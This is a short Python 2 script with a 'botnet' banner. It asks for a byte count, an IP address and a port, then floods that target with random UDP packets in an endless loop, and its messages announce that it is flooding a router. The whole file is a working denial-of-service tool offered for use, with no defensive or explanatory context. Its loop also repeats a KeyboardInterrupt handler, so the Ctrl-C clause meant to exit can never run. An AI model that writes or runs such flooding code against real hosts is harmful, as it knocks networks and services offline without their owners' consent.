import sys
import os
import random
import socket
from sys import platform





if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    print "This Script Works Best on Kali linux"
elif platform == "win32":
    os.system("cls")
else:
    print "\033[1;34m [-]Unknown System Detected \033[1;m"

print "\033[35m"

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print """
   ___  _______  _____  __  ___  ____  _______  ____________
  / _ \/ __/ _ \/ _ \ \/ / / _ )/ __ \/_  __/ |/ / __/_  __/
 / // / _// , _/ ___/\  / / _  / /_/ / / / /    / _/  / /   
/____/___/_/|_/_/    /_/ /____/\____/ /_/ /_/|_/___/ /_/    
                                                            
"""



try:
    size = input("bytes> ")
    attack = random._urandom(size)
    ip = raw_input("IP> ")
    port = input("port> ")
    print " "
    print "Flooding fucking shitty router"
    print " "
except SyntaxError:
    print " "
    exit("\033[1;34m ERROR \033[1;m")
except NameError:
    print " "
    exit("\033[1;34m Invalid Input \033[1;m")
except KeyboardInterrupt:
    print " "
    exit("\033[1;34m [-]Canceled By User \033[1;m")
except ImportError:
    print " "
    exit("\033[1;34m [-]Install python 2.7.15")


while True:
    try:
        connect.sendto(attack, (ip, port))
    except KeyboardInterrupt:
        print ('Flooding shitty router')
    except KeyboardInterrupt:
        print " "
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    except ImportError:
        print " "
        exit("\033[1;34m [-]Install python 2.7.15")
